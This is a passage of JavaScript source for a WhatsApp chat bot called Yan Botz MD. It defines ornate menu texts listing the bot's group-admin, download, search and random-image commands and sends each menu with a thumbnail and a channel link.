┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚋𝚘𝚝
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚕𝚘𝚠
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚞𝚙𝚊𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚞𝚜𝚒𝚊𝚙𝚊
┃╰───────────────╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭───────────────╮ 
┃│ 〘 OWNER MENU 〙
┃╰───────────────╯ 
┃╭───────────────╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚎𝚊𝚟𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃╰━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'groupmenu':  case 'grupmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•GROUP_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'webzonemenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•WEBZONE_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'downloadmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃  ݊⃟̥⃝̇݊⃟╾•DOWNLOAD_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'searchmenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•SEARCH_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'randommenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•RANDOM_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚞𝚒𝚜𝚒
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚒𝚖𝚎
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚜𝚋𝚞
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
┃│᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
┃╰━━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": `© ꧁✿𝗬𝗮𝗻 𝗧𝗵𝗲𝘀𝗼𝗽𝗽ッ𝟮𝟱𝟴〠✿꧂`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: anu }, {quoted: fkonjo, contextInfo:{}})
}
break
 case 'tekspromenu': {
 if (!isCreator && !isBan) return 
 anu = `
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │  ݊⃟̥⃝̇݊⃟╾•🎗𝐌𝐄𝐍𝐔_𝐍𝐘𝐀🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━━━╮
┃┃   ݊⃟̥⃝̇݊⃟╾•TEKSPRO_MENU•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━━━╯
┃╭━━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
